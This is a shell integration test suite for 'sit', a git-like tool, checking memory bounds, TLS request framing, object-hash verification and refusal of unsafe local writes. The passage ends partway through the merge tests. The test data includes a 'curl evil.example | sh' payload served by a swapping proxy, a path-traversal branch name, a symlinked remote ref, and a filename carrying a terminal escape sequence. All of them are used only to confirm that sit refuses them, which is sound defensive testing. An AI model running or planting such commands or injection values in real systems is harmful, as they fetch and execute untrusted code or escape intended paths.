# 1.7.3 stopped delta chains at 64 and read each .idx / .pack through a 64 MiB
# cap, so those objects read as missing (sit_repo_status then called a clean
# file modified). The corpus builds chains of 100, 4095 and 4096 (refused, past
# git's ceiling), REF_DELTA chains across two packs, a REF cycle, a 75 MiB pack,
# and a real `git repack --depth=300` repo checked against `git cat-file`.
# 9 of its 11 cases fail on 1.7.3; the two refusals pass on both.
hr "1.7.4 git read-mode depth and size"
if command -v python3 >/dev/null 2>&1; then
  if python3 -I "$ROOT/tests/integration/deep_pack.py" "$SIT" "$WORK/deep" >"$WORK/deep.log" 2>&1; then
    N=$(grep -c '^  PASS' "$WORK/deep.log")
    i=0; while [ "$i" -lt "$N" ]; do ok; i=$((i+1)); done
  else
    bad "deep-pack corpus (see below)"
    sed 's/^/    /' "$WORK/deep.log"
  fi
  rm -rf "$WORK/deep"
else
  printf '  SKIP: python3 not installed — deep-pack corpus skipped\n'
fi

# ── 29. 1.7.5 git read mode keeps nothing per object read ───────────
# owl and thoth read objects in-process, on a heap with no free. 1.7.4 kept
# about 4 KB per small loose read (the compressed file and an inflate buffer
# sit then discarded; ~69 KB for a 190 KB text file) and 672 bytes per packed
# read (the pack-directory listing and paths). 1.7.5 keeps none of sit's; the
# bound allows sankoch's 32 bytes per inflate, an upstream ask. The pack is
# built without deltas so each read is exactly one inflate.
hr "1.7.5 git read-mode heap per read"
if [ -n "$READ_PROBE" ] && command -v git >/dev/null 2>&1; then
  R="$WORK/rh175"; mkdir -p "$R"; cd "$R"
  git init -q -b main 2>/dev/null || git init -q
  i=0; while [ "$i" -lt 40 ]; do printf 'line %s of a loose blob\n' "$i" > "f$i.txt"; i=$((i+1)); done
  git add . && git -c user.name=t -c user.email=t@t commit -qm loose
  git rev-list --objects --all | awk 'length($1)==40 {print $1}' > "$WORK/rh175.ids"
  read -r _ PER N <<< "$("$READ_PROBE" "$WORK/rh175.ids" | grep '^READ')"
  assert_eq "${N:-0}" "$(wc -l < "$WORK/rh175.ids" | tr -d ' ')" "29a: every loose object reads"
  [ "${PER:-99999}" -le 32 ] 2>/dev/null && ok || bad "29a: a loose read kept ${PER:-?} bytes (bound 32, sankoch's inflate; 1.7.4 ~4100)"
  git repack -adfq --depth=0 --window=0 && git prune-packed
  read -r _ PER N <<< "$("$READ_PROBE" "$WORK/rh175.ids" | grep '^READ')"
  assert_eq "${N:-0}" "$(wc -l < "$WORK/rh175.ids" | tr -d ' ')" "29b: every packed object reads"
  [ "${PER:-99999}" -le 32 ] 2>/dev/null && ok || bad "29b: a packed read kept ${PER:-?} bytes (bound 32; 1.7.4 ~700)"
  read -r _ LOC <<< "$("$READ_PROBE" "$WORK/rh175.ids" | grep '^LOCATE')"
  assert_eq "${LOC:-none}" "0" "29b: a pack lookup keeps nothing"
elif [ "$READ_PROBE_BROKEN" = 1 ]; then
  bad "29: read_heap_probe does not compile against dist/sit-read.cyr"
  sed 's/^/    /' "$WORK/read_heap_probe.log"
else
  echo "  (skipped 29: needs cyrius and git)"
fi

# ── 30. 1.7.5 sit serve keeps nothing per ref push ─────────────────
# A ref push runs the fast-forward check, which walks the pushed tip's history.
# 1.7.4 kept every commit it read (~4.5 KB each: on this 300-commit fixture
# ~1.3 MB per push, refused or not), and a client can push a long chain once and
# refuse-push it at will. 1.7.5 walks on an arena rewound per walk. The bound
# allows sankoch's 32 bytes per inflate (an upstream ask), one per commit walked.
hr "1.7.5 serve heap per ref push"
if [ -n "$PUSH_PROBE" ]; then
  R="$WORK/sp175"; mkdir -p "$R"; cd "$R"
  "$SIT" init >/dev/null
  i=0; while [ "$i" -lt 300 ]; do printf '%s\n' "$i" > f.txt; "$SIT" add f.txt >/dev/null; "$SIT" commit -m "c$i" >/dev/null; i=$((i+1)); done
  TIP=$(tr -d '\n' < .sit/refs/heads/main)
  PAR=$("$SIT" log | awk '/^commit /{n++; if (n==2) {print $2; exit}}')
  ROOTC=$("$SIT" log | awk '/^commit /{h=$2} END{print h}')
  OUT=$("$PUSH_PROBE" "$R" "$TIP" "$PAR" "$ROOTC")
  REF=$(printf '%s\n' "$OUT" | awk '/^REFUSED/{print $2}')
  UPD=$(printf '%s\n' "$OUT" | awk '/^UPDATE/{print $2}')
  [ "${REF:-999999}" -le 9600 ] 2>/dev/null && ok || bad "30a: a refused push over 300 commits kept ${REF:-?} bytes (bound 9600, sankoch's 32 per inflate; 1.7.4 ~1.3 MB)"
  [ "${UPD:-999999}" -le 9600 ] 2>/dev/null && ok || bad "30b: a fast-forward update over 300 commits kept ${UPD:-?} bytes (bound 9600; 1.7.4 ~1.3 MB)"
  assert_eq "$(tr -d '\n' < .sit/refs/heads/probe)" "$TIP" "30b: and the update landed"
elif [ "$PUSH_PROBE_BROKEN" = 1 ]; then
  bad "30: serve_push_probe does not compile against dist/sit.cyr"
  sed 's/^/    /' "$WORK/serve_push_probe.log"
else
  echo "  (skipped 30: needs cyrius)"
fi

# ── 31. 1.7.6 large pushes and --tls request framing (N2, N5) ──────
# Every serve loop buffered 64 KiB (sandhi's default) while capabilities
# advertised 16 MiB, so pushing any object over ~64 KiB failed over http, https
# and ssh (1.7.5: 413 / 400 / 400). And the --tls loop dispatched an oversized
# request truncated and framed what followed as more requests. Each push goes to
# a fresh repo, so 201 (stored) is the answer.
hr "1.7.6 large pushes and --tls framing"
if command -v python3 >/dev/null 2>&1; then
  R="$WORK/fr176"; mkdir -p "$R"; cd "$R"
  FR="$ROOT/tests/integration/serve_framing.py"
  python3 -I -c '
import hashlib, os, zlib
c = os.urandom(200000)
f = b"blob %d\0" % len(c) + c
open("obj.z", "wb").write(zlib.compress(f))
open("obj.hex", "w").write(hashlib.sha256(f).hexdigest())
'
  H=$(cat obj.hex)
  for t in http https stdio; do mkdir -p "r$t"; (cd "r$t" && "$SIT" init >/dev/null); done
  "$SIT" serve "$R/rhttp" --listen 127.0.0.1:18760 > /dev/null 2>&1 & FP1=$!
  waitport 18760
  assert_eq "$(python3 -I "$FR" push http 18760 obj.z "$H")" "push 201" "31a: a 200 KB object push over http is stored"
  kill $FP1 2>/dev/null; wait $FP1 2>/dev/null
  assert_eq "$(python3 -I "$FR" stdio "$SIT" "$R/rstdio" obj.z "$H")" "push 201" "31b: and over --stdio (the ssh transport)"
  if command -v openssl >/dev/null 2>&1; then
    openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
      -keyout k.pem -out c.pem -days 2 -nodes -subj "/CN=localhost" > /dev/null 2>&1
    "$SIT" serve "$R/rhttps" --tls --cert c.pem --key k.pem --listen 127.0.0.1:18761 > /dev/null 2>&1 & FP2=$!
    waitport 18761
    assert_eq "$(python3 -I "$FR" push https 18761 obj.z "$H")" "push 201" "31c: and over --tls"
    FOUT=$(timeout 60 python3 -I "$FR" frame https 18761)
    assert_contains "$FOUT" "toolarge 413" "31d: --tls answers 413 to a body past the limit, not a truncated dispatch"
    assert_contains "$FOUT" "clte 400" "31d: and 400 to Content-Length with Transfer-Encoding"
    assert_contains "$FOUT" "chunked 501" "31d: and 501 to a chunked body"
    assert_contains "$FOUT" "pipelined 1 " "31d: and answers one of two pipelined requests, then closes"
    # 31e (N3): a pin file that exists but cannot be read is not "no pins" —
    # 1.7.5 then pinned whatever certificate the next connection presented.
    if [ "$(id -u)" != "0" ]; then
      mkdir -p "$R/tofu" && (cd "$R/tofu" && "$SIT" init >/dev/null && "$SIT" remote add o https://127.0.0.1:18761 >/dev/null)
      (cd "$R/tofu" && "$SIT" fetch o main >/dev/null 2>&1)
      if [ -f "$HOME/.sit/known_certs" ]; then
        chmod 000 "$HOME/.sit/known_certs"
        TOUT=$(cd "$R/tofu" && "$SIT" fetch o main 2>&1); TRC=$?
        chmod 600 "$HOME/.sit/known_certs"
        assert_eq "$TRC" "1" "31e: an unreadable pin file refuses the connection"
        assert_contains "$TOUT" "cannot read ~/.sit/known_certs" "31e: and says why"
      else
        bad "31e: first contact over --tls recorded no pin"
      fi
    fi
    kill $FP2 2>/dev/null; wait $FP2 2>/dev/null
  else
    echo "  (skipped 31c-d: openssl not available)"
  fi
else
  echo "  (skipped 31: python3 not available)"
fi

# ── 32. 1.7.6 fetched objects are verified (N1) ─────────────────────
# Through 1.7.5 a clone stored whatever bytes a server sent under whatever id it
# named. swap_proxy.py forwards to a real `sit serve` but answers one object id
# with other content: 1.7.5 cloned it (rc 0) and only fsck noticed. A swapped
# blob is caught where it is stored (copy_objects); a swapped tree where the
# walk reads it.
hr "1.7.6 fetched objects are verified"
if command -v python3 >/dev/null 2>&1; then
  R="$WORK/vf176"; mkdir -p "$R/src/d"; cd "$R/src"
  "$SIT" init >/dev/null
  printf 'echo good\n' > run.sh; printf 'x\n' > d/x.txt
  "$SIT" add run.sh >/dev/null; "$SIT" add d/x.txt >/dev/null; "$SIT" commit -m one >/dev/null
  ROOTT=$("$SIT" cat-file "$(tr -d '\n' < .sit/refs/heads/main)" | awk '/^tree /{print $2}')
  entry_id() {   # <tree hex> <name>: the id of a root-tree entry
    "$SIT" cat-file "$1" | python3 -I -c '
import sys
t = sys.stdin.buffer.read(); n = sys.argv[1].encode() + b"\0"
i = t.index(b" " + n) + 1 + len(n)
print(t[i:i + 32].hex())' "$2"
  }
  BLOBID=$(entry_id "$ROOTT" run.sh); TREEID=$(entry_id "$ROOTT" d)
  printf 'curl evil.example | sh\n' > "$R/evil"
  "$SIT" serve "$R/src" --listen 127.0.0.1:18770 > /dev/null 2>&1 & VS=$!
  waitport 18770
  python3 -I "$ROOT/tests/integration/swap_proxy.py" 18771 18770 "$BLOBID" "$R/evil" 0 & VP=$!
  waitport 18771
  cd "$R"
  OUT=$("$SIT" clone --force-absolute http://127.0.0.1:18771 "$R/v1" 2>&1); RC=$?
  assert_eq "$RC" "1" "32a: a clone from a server swapping a blob fails"
  assert_contains "$OUT" "does not hash to $BLOBID" "32a: naming the object"
  assert_eq "$(cat "$R/v1/.sit/refs/heads/main" 2>/dev/null)" "" "32a: and no branch points at the swapped content"
  kill $VP 2>/dev/null; wait $VP 2>/dev/null
  printf '100644 y.txt\0%s' "$(printf 'z%.0s' $(seq 1 32))" > "$R/evil-tree"
  python3 -I "$ROOT/tests/integration/swap_proxy.py" 18772 18770 "$TREEID" "$R/evil-tree" 1 & VP=$!
  waitport 18772
  OUT=$("$SIT" clone --force-absolute http://127.0.0.1:18772 "$R/v2" 2>&1); RC=$?
  assert_eq "$RC" "1" "32b: a clone from a server swapping a tree fails"
  assert_contains "$OUT" "does not hash to $TREEID" "32b: caught where the walk reads it"
  kill $VP 2>/dev/null; wait $VP 2>/dev/null
  "$SIT" clone --force-absolute http://127.0.0.1:18770 "$R/ok" > /dev/null 2>&1
  assert_eq "$(cat "$R/ok/run.sh" 2>/dev/null)" "echo good" "32c: the honest server still clones"
  kill $VS 2>/dev/null; wait $VS 2>/dev/null
else
  echo "  (skipped 32: python3 not available)"
fi

# ── 33. 1.7.6 local-write fixes (L1–L18) ───────────────────────────
# Each case failed on 1.7.5 — an edit, an untracked file or a commit's change
# lost with rc 0, or a command that did something other than what it said.
hr "1.7.6 local-write fixes"
R="$WORK/lw176"; mkdir -p "$R"; cd "$R"
c() { "$SIT" add "$1" >/dev/null; }

# L1: octopus merge refuses a dirty tree instead of overwriting the edit.
mkdir l1 && cd l1 && "$SIT" init >/dev/null
echo base > a.txt; c a.txt; "$SIT" commit -m base >/dev/null
"$SIT" branch b1 >/dev/null; "$SIT" branch b2 >/dev/null
"$SIT" checkout b1 >/dev/null; echo one > one.txt; c one.txt; "$SIT" commit -m one >/dev/null
"$SIT" checkout b2 >/dev/null; echo two > two.txt; c two.txt; "$SIT" commit -m two >/dev/null
"$SIT" checkout main >/dev/null; echo "PRECIOUS" > a.txt
"$SIT" merge b1 b2 >/dev/null 2>&1; assert_eq "$?" "1" "L1: octopus merge refuses a dirty tree"
assert_eq "$(cat a.txt)" "PRECIOUS" "L1: and the uncommitted edit is intact"
cd "$R"

# L2: reset --hard clears an abandoned merge; checkout refuses mid-merge.
mkdir l2 && cd l2 && "$SIT" init >/dev/null
printf 'a\nb\nc\n' > f.txt; c f.txt; "$SIT" commit -m base >/dev/null; "$SIT" branch feat >/dev/null
printf 'a\nMAIN\nc\n' > f.txt; c f.txt; "$SIT" commit -m m >/dev/null
"$SIT" checkout feat >/dev/null; printf 'a\nFEAT\nc\n' > f.txt; c f.txt; "$SIT" commit -m f >/dev/null
"$SIT" checkout main >/dev/null; "$SIT" merge feat >/dev/null 2>&1
"$SIT" checkout feat >/dev/null 2>&1; assert_eq "$?" "1" "L2: checkout refuses while a merge is in progress"
"$SIT" reset --hard HEAD >/dev/null 2>&1
[ -e .sit/MERGE_HEAD ] && bad "L2: reset --hard left MERGE_HEAD" || ok
echo u > u.txt; c u.txt; "$SIT" commit -m after >/dev/null
assert_eq "$("$SIT" cat-file HEAD | grep -c '^parent ')" "1" "L2: the next commit is not a merge"
cd "$R"

# L3: a conflicted merge refuses to write over an untracked file at a conflict path.
mkdir l3 && cd l3 && "$SIT" init >/dev/null
echo v1 > p.txt; echo k > k.txt; c p.txt; c k.txt; "$SIT" commit -m base >/dev/null; "$SIT" branch feat >/dev/null
"$SIT" rm p.txt >/dev/null; "$SIT" commit -m del >/dev/null
"$SIT" checkout feat >/dev/null; echo v2 > p.txt; c p.txt; "$SIT" commit -m mod >/dev/null
"$SIT" checkout main >/dev/null; echo "NOTES" > p.txt
"$SIT" merge feat >/dev/null 2>&1
assert_eq "$(cat p.txt)" "NOTES" "L3: an untracked file at a conflict path survives the merge"
cd "$R"

# L4: sit rm refuses a file with unstaged edits (--cached still works).
mkdir l4 && cd l4 && "$SIT" init >/dev/null
echo v1 > a.txt; c a.txt; "$SIT" commit -m base >/dev/null; echo "UNSAVED" >> a.txt
"$SIT" rm a.txt >/dev/null 2>&1; assert_eq "$?" "1" "L4: rm refuses a changed file"
assert_contains "$(cat a.txt)" "UNSAVED" "L4: and the edit is still there"
cd "$R"

# L5: a ref that is not a commit id is an error, not "no commits yet".
mkdir l5 && cd l5 && "$SIT" init >/dev/null
for i in 1 2; do echo $i > f$i.txt; c f$i.txt; "$SIT" commit -m c$i >/dev/null; done
: > .sit/refs/heads/main; echo x > n.txt; c n.txt
"$SIT" commit -m after >/dev/null 2>&1; assert_eq "$?" "1" "L5: commit refuses over a broken branch ref"
cd "$R"

# L6: stash refuses when a file HEAD tracks but the index does not has changed.
mkdir l6 && cd l6 && "$SIT" init >/dev/null
echo v1 > a.txt; echo k > k.txt; c a.txt; c k.txt; "$SIT" commit -m b >/dev/null
"$SIT" rm --cached a.txt >/dev/null; echo "UNTRACKED WORK" > a.txt; echo e >> k.txt
"$SIT" stash >/dev/null 2>&1; assert_eq "$?" "1" "L6: stash refuses"
assert_eq "$(cat a.txt)" "UNTRACKED WORK" "L6: and the unstaged file keeps its content"
cd "$R"

# L7: rebase --continue after a non-conflict stop re-applies the step.
mkdir l7 && cd l7 && "$SIT" init >/dev/null
printf 'l1\nl2\n' > a.txt; c a.txt; "$SIT" commit -m base >/dev/null; "$SIT" checkout -b feature >/dev/null
printf 'l1\nl2\nIMPORTANT\n' > a.txt; c a.txt; echo s > tmp.txt; c tmp.txt; "$SIT" commit -m X >/dev/null
"$SIT" rm tmp.txt >/dev/null; "$SIT" commit -m Y >/dev/null
"$SIT" checkout main >/dev/null; echo u > u.txt; c u.txt; "$SIT" commit -m U >/dev/null; "$SIT" checkout feature >/dev/null
echo notes > tmp.txt; "$SIT" rebase main >/dev/null 2>&1; mv tmp.txt ../l7-notes
"$SIT" rebase --continue >/dev/null 2>&1; assert_eq "$?" "0" "L7: --continue completes"
assert_contains "$(cat a.txt)" "IMPORTANT" "L7: and the stopped commit's change is applied"
cd "$R"
# L7b: a step that got as far as its tree but whose ref write failed is
# committed by --continue, not re-applied over the now-changed tree forever.
if [ "$(id -u)" != "0" ]; then
  mkdir l7b && cd l7b && "$SIT" init >/dev/null
  printf 'a\nb\nc\n' > f.txt; c f.txt; "$SIT" commit -m base >/dev/null; "$SIT" checkout -b feature >/dev/null
  printf 'a\nFEAT\nc\n' > f.txt; c f.txt; "$SIT" commit -m X >/dev/null; echo y > y.txt; c y.txt; "$SIT" commit -m Y >/dev/null
  "$SIT" checkout main >/dev/null; printf 'a\nMAIN\nc\n' > f.txt; c f.txt; "$SIT" commit -m M >/dev/null
  "$SIT" checkout feature >/dev/null; "$SIT" rebase main >/dev/null 2>&1
  printf 'a\nRESOLVED\nc\n' > f.txt; c f.txt; "$SIT" commit -m "X resolved" >/dev/null
  chmod a-w .sit/refs/heads; "$SIT" rebase --continue >/dev/null 2>&1; chmod u+w .sit/refs/heads
  "$SIT" rebase --continue >/dev/null 2>&1; assert_eq "$?" "0" "L7b: --continue after a failed ref write completes"
  assert_contains "$("$SIT" log --oneline | head -1)" "Y" "L7b: and records the step"
  cd "$R"
fi

# L8: a commit whose subtree is missing is refused, not read as an empty
# directory (1.7.5 checked out top.txt alone, deleted d/, and said "clean").
if command -v python3 >/dev/null 2>&1; then
  mkdir -p l8/a l8/b && cd l8/a && "$SIT" init >/dev/null
  mkdir d; echo f > d/f.txt; echo t > top.txt; c d/f.txt; c top.txt; "$SIT" commit -m a >/dev/null
  CA=$(tr -d '\n' < .sit/refs/heads/main); TA=$("$SIT" cat-file "$CA" | awk '/^tree /{print $2}')
  TOPB=$("$SIT" cat-file "$TA" | python3 -I -c '
import sys
t = sys.stdin.buffer.read(); n = b"top.txt\0"; i = t.index(b" " + n) + 1 + len(n)
print(t[i:i + 32].hex())')
  cd "$R/l8/b" && "$SIT" init >/dev/null
  mkdir d; echo mine > d/f.txt; echo keep > d/keep.txt; echo t > top.txt
  c d/f.txt; c d/keep.txt; c top.txt; "$SIT" commit -m b >/dev/null
  for o in "$CA" "$TA" "$TOPB"; do
    ( cd "$R/l8/a" && "$SIT" cat-file "$o" ) > "$R/l8/obj"
    python3 -I -c '
import hashlib, os, sys, zlib
h, src = sys.argv[1], sys.argv[2]; content = open(src, "rb").read()
for t in (b"blob", b"tree", b"commit"):
    full = t + b" " + str(len(content)).encode() + b"\0" + content
    if hashlib.sha256(full).hexdigest() == h:
        d = os.path.join(".sit", "objects", h[:2]); os.makedirs(d, exist_ok=True)
        open(os.path.join(d, h[2:]), "wb").write(zlib.compress(full)); break' "$o" "$R/l8/obj"
  done
  printf '%s\n' "$CA" > .sit/refs/heads/broken
  "$SIT" checkout broken >/dev/null 2>&1; assert_eq "$?" "1" "L8: checkout of a commit with a missing subtree refuses"
  [ -f d/keep.txt ] && ok || bad "L8: and d/ is left as it was"
  "$SIT" reset --hard broken >/dev/null 2>&1; assert_eq "$?" "1" "L8: reset --hard refuses it too"
  "$SIT" merge broken >/dev/null 2>&1; [ "$?" != "0" ] && ok || bad "L8: merge of it must not succeed"
  "$SIT" show broken >/dev/null 2>&1; assert_eq "$?" "1" "L8: show refuses it instead of listing files as deleted"
  cd "$R"
fi

# L9 is covered by the unit suite (hunks_overlap / three_way_line_merge).

# L10: re-running init keeps HEAD on its branch.
mkdir l10 && cd l10 && "$SIT" init >/dev/null
echo a > a.txt; c a.txt; "$SIT" commit -m base >/dev/null; "$SIT" checkout -b feature >/dev/null
"$SIT" init >/dev/null; assert_eq "$(cat .sit/HEAD)" "ref: refs/heads/feature" "L10: reinit leaves HEAD alone"
cd "$R"

# L11 / X1 / X3: file:// push validates the branch and never writes through a symlink.
mkdir -p l11/remote l11/local l11/victim
( cd l11/remote && "$SIT" init >/dev/null )
cd l11/local && "$SIT" init >/dev/null && echo a > a && c a && "$SIT" commit -m c >/dev/null
"$SIT" remote add origin "file://$R/l11/remote" >/dev/null
echo precious > "$R/l11/victim/notes.txt"
"$SIT" push origin ../../../../victim/notes.txt >/dev/null 2>&1; assert_eq "$?" "1" "L11: push refuses a traversal branch name"
assert_eq "$(cat "$R/l11/victim/notes.txt")" "precious" "L11: and writes nothing outside the remote"
ln -s "$R/l11/victim/o.txt" "$R/l11/remote/.sit/refs/heads/topic"; echo keep > "$R/l11/victim/o.txt"
"$SIT" checkout -b topic >/dev/null
"$SIT" push origin topic >/dev/null 2>&1; assert_eq "$?" "1" "L11: push refuses a symlinked remote ref"
assert_eq "$(cat "$R/l11/victim/o.txt")" "keep" "L11: and does not write through it"
cd "$R"

# L12 / L13: index writes are one transaction — a refused write is reported,
# and `sit mv` puts the file back when the index cannot follow it.
mkdir l12 && cd l12 && "$SIT" init >/dev/null
for i in $(seq 40); do echo f$i > f$i.txt; c f$i.txt; done; "$SIT" commit -m b >/dev/null
if command -v python3 >/dev/null 2>&1; then
  fsz() { python3 -I -c '
import resource, signal, subprocess, sys
lim = int(sys.argv[1])
def pre():
    signal.signal(signal.SIGXFSZ, signal.SIG_IGN)
    resource.setrlimit(resource.RLIMIT_FSIZE, (lim, lim))
sys.exit(subprocess.run(sys.argv[2:], preexec_fn=pre, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode)' "$@"; }
  echo f1 > copy.txt
  fsz 4096 "$SIT" add copy.txt; assert_eq "$?" "1" "L12: add reports a refused index write"
  fsz 4096 "$SIT" mv f2.txt moved.txt; assert_eq "$?" "1" "L13: mv reports a refused index write"
  [ -f f2.txt ] && [ ! -e moved.txt ] && ok || bad "L13: and the file is moved back"
fi
"$SIT" mv f3.txt "d/$(printf 'x%.0s' $(seq 200))/$(printf 'y%.0s' $(seq 60))" >/dev/null 2>&1
assert_eq "$?" "1" "L13: mv refuses a destination past the index path limit"
[ -f f3.txt ] && ok || bad "L13: and leaves the source in place"
cd "$R"

# L14: add refuses a path beyond a symlink, and a symlink itself.
mkdir -p l14/outside && echo SECRET > l14/outside/s.txt && mkdir l14/r && cd l14/r && "$SIT" init >/dev/null
ln -s "$R/l14/outside" linkdir; ln -s "$R/l14/outside/s.txt" link.txt
"$SIT" add linkdir/s.txt >/dev/null 2>&1; assert_eq "$?" "1" "L14: add refuses a path beyond a symlink"
"$SIT" add link.txt >/dev/null 2>&1; assert_eq "$?" "1" "L14: add refuses a symlink"
cd "$R"

# L15: config set on an unreadable config refuses instead of replacing it.
if [ "$(id -u)" != "0" ]; then
  mkdir l15 && cd l15 && "$SIT" init >/dev/null && "$SIT" remote add origin file:///x >/dev/null
  chmod 000 .sit/config; "$SIT" config user.email a@b >/dev/null 2>&1; RC=$?; chmod 600 .sit/config
  assert_eq "$RC" "1" "L15: config set refuses an unreadable config"
  assert_contains "$(cat .sit/config)" "remote.origin.url" "L15: and the config is intact"
  # The atomic replace keeps the replaced file's mode: a 0600 config stays 0600.
  chmod 600 "$HOME/.sitconfig" 2>/dev/null || { "$SIT" config --global a.b c >/dev/null; chmod 600 "$HOME/.sitconfig"; }
  "$SIT" config --global user.email a@b >/dev/null
  assert_eq "$(stat -c %a "$HOME/.sitconfig")" "600" "L15: config --global keeps a 0600 ~/.sitconfig at 0600"
  cd "$R"
fi

# L16: status prints worktree names display-safe.
mkdir l16 && cd l16 && "$SIT" init >/dev/null
touch "$(printf 'evil\033]0;PWNED\007.txt')"
case "$("$SIT" status)" in *"$(printf '\033')"*) bad "L16: status printed a raw ESC";; *) ok;; esac
cd "$R"

# L17: options are not taken as names or messages; merge honours -S anywhere.
mkdir l17 && cd l17 && "$SIT" init >/dev/null && echo a > a && c a && "$SIT" commit -m b >/dev/null
"$SIT" branch -D x >/dev/null 2>&1; assert_eq "$?" "1" "L17: branch -D is not a branch name"
[ -e .sit/refs/heads/-D ] && bad "L17: a branch named -D was created" || ok
"$SIT" tag -f v1 >/dev/null 2>&1; assert_eq "$?" "1" "L17: tag -f is not a tag name"
"$SIT" commit --amend >/dev/null 2>&1; assert_eq "$?" "1" "L17: commit --amend is not a message"
"$SIT" branch f2 >/dev/null; "$SIT" merge f2 -q >/dev/null 2>&1; assert_eq "$?" "1" "L17: merge refuses an unknown trailing option"
cd "$R"

# L18: an empty tree can be built (revert of a root commit).
mkdir l18 && cd l18 && "$SIT" init >/dev/null && echo a > a && c a && "$SIT" commit -m base >/dev/null
"$SIT" revert HEAD >/dev/null 2>&1; assert_eq "$?" "0" "L18: revert of a root commit succeeds"
[ -e a ] && bad "L18: and removes the file" || ok
cd "$R"

# R12: a commit with two tree headers is refused everywhere, and fsck calls it bad.
mkdir r12 && cd r12 && "$SIT" init >/dev/null && echo a > a && c a && "$SIT" commit -m one >/dev/null
P=$(tr -d '\n' < .sit/refs/heads/main); T=$("$SIT" cat-file "$P" | awk '/^tree /{print $2}')
if command -v python3 >/dev/null 2>&1; then
  C=$(python3 -I -c '
import hashlib, os, sys, zlib
t, p = sys.argv[1], sys.argv[2]
body = ("tree %s\ntree %s\nparent %s\nauthor x <x@x> 1 +0000\ncommitter x <x@x> 1 +0000\n\nm\n" % (t, t, p)).encode()
f = b"commit %d\0" % len(body) + body; o = hashlib.sha256(f).hexdigest()
d = os.path.join(".sit", "objects", o[:2]); os.makedirs(d, exist_ok=True)
open(os.path.join(d, o[2:]), "wb").write(zlib.compress(f)); print(o)' "$T" "$P")
  printf '%s\n' "$C" > .sit/refs/heads/evil
  "$SIT" checkout evil >/dev/null 2>&1; assert_eq "$?" "1" "R12: checkout refuses a two-tree commit"
  assert_contains "$("$SIT" fsck 2>&1)" "malformed commit $C" "R12: fsck reports it"
  "$SIT" fsck --prune-now >/dev/null 2>&1; assert_eq "$?" "1" "R12: and --prune refuses while it is there"
fi
cd "$R"

# R11: a FIFO where a repo file is expected reads as absent instead of hanging.
mkdir r11 && cd r11 && "$SIT" init >/dev/null
mkfifo .sit/config
timeout 10 "$SIT" config user.name >/dev/null 2>&1; RC=$?
[ "$RC" != "124" ] && ok || bad "R11: a FIFO .sit/config hung the reader"
rm -f .sit/config; mkfifo f.txt
timeout 10 "$SIT" add f.txt >/dev/null 2>&1; RC=$?
[ "$RC" = "1" ] && ok || bad "R11: add of a FIFO should refuse (rc $RC)"
cd "$R"

# ── 34. 1.7.6 read path: what the API keeps, reflog cost (R1 / R7 / R9) ──
# 1.7.5's sit_repo_status kept every blob and worktree file it compared — 10 MB
# per call on 200 files of 50 KB, ~200 MB of resident growth over 10 calls in
# owl / thoth — and sit_diff_path diffed an unchanged file instead of returning
# 0. A 5,000-entry reflog took 11 s to fsck (each line found by a rescan).
hr "1.7.6 read path"
if [ -n "$API_PROBE" ] && command -v git >/dev/null 2>&1 && command -v python3 >/dev/null 2>&1; then
  R="$WORK/api176"; mkdir -p "$R"; cd "$R"
  git init -q . && python3 -I -c '
import random
r = random.Random(1)
for i in range(200):
    open("f%03d.txt" % i, "w").write("".join(chr(97 + r.randrange(26)) for _ in range(50000)) + "\n")'
  git add . && git -c user.name=t -c user.email=t@t commit -qm c && git gc -q
  read -r _ SB SR <<< "$("$API_PROBE" f001.txt 10 | grep '^STATUS')"
  read -r _ DB DR DZ <<< "$("$API_PROBE" f001.txt 10 | grep '^DIFF')"
  [ "${SR:-99999}" -lt 8192 ] 2>/dev/null && ok || bad "R1: 10 sit_repo_status calls grew RSS by ${SR:-?} KB (bound 8192; 1.7.5 ~202000)"
  [ "${SB:-99999999}" -lt 1048576 ] 2>/dev/null && ok || bad "R1: sit_repo_status kept ${SB:-?} B per call (bound 1 MiB; 1.7.5 ~10 MB)"
  assert_eq "${DZ:-none}" "1" "R9: sit_diff_path of an unchanged file returns 0"
  [ "${DR:-99999}" -lt 4096 ] 2>/dev/null && ok || bad "R9: 10 sit_diff_path calls grew RSS by ${DR:-?} KB (bound 4096)"
elif [ "$API_PROBE_BROKEN" = 1 ]; then
  bad "R1: tests/integration/api_heap_probe.cyr no longer compiles against dist/sit-read.cyr (see $WORK/api_heap_probe.log)"
else
  echo "  (skipped 34 API probe: cyrius, git or python3 not available)"
fi
R="$WORK/rl176"; mkdir -p "$R"; cd "$R"
"$SIT" init >/dev/null; echo a > a; "$SIT" add a >/dev/null; "$SIT" commit -m c >/dev/null
L=$(head -1 .sit/logs/HEAD); : > .sit/logs/HEAD
for _ in $(seq 20000); do printf '%s\n' "$L"; done > .sit/logs/HEAD
T0=$(date +%s); "$SIT" fsck >/dev/null 2>&1; FRC=$?; "$SIT" reflog -n 3 >/dev/null 2>&1; T1=$(date +%s)
assert_eq "$FRC" "0" "R7: fsck over a 20,000-entry reflog succeeds"
[ $((T1 - T0)) -lt 10 ] && ok || bad "R7: fsck + reflog over 20,000 entries took $((T1 - T0)) s (1.7.5: minutes)"

# ── 35. 1.8.0 `merge -m` ─────────────────────────────────────────────
# Through 1.7.x `-m` was accepted and ignored, and any flag sent an octopus
# down the single-branch path (so an octopus could not be signed).
hr "1.8.0 merge -m"
R="$WORK/mm180"; mkdir -p "$R"; cd "$R"
subj() { "$SIT" cat-file HEAD | sed -n '/^$/{n;p;q}'; }
c() { "$SIT" add "$1" >/dev/null; }
"$SIT" init >/dev/null; printf 'a\nb\nc\n' > f.txt; c f.txt; "$SIT" commit -m base >/dev/null
for b in feat o1 o2 c1; do "$SIT" branch $b >/dev/null; done
"$SIT" checkout feat >/dev/null; echo x > x.txt; c x.txt; "$SIT" commit -m feat >/dev/null
"$SIT" checkout o1 >/dev/null; echo 1 > o1.txt; c o1.txt; "$SIT" commit -m o1 >/dev/null
"$SIT" checkout o2 >/dev/null; echo 2 > o2.txt; c o2.txt; "$SIT" commit -m o2 >/dev/null
"$SIT" checkout c1 >/dev/null; printf 'a\nC1\nc\n' > f.txt; c f.txt; "$SIT" commit -m c1 >/dev/null
"$SIT" checkout main >/dev/null; echo m > m.txt; c m.txt; "$SIT" commit -m main >/dev/null
"$SIT" merge -m "Bring in feat" feat >/dev/null 2>&1
assert_eq "$(subj)" "Bring in feat" "35a: a clean merge takes -m's message (flag before the branch)"
"$SIT" key generate >/dev/null 2>&1
"$SIT" merge o1 -S o2 -m "Octo" >/dev/null 2>&1; ORC=$?
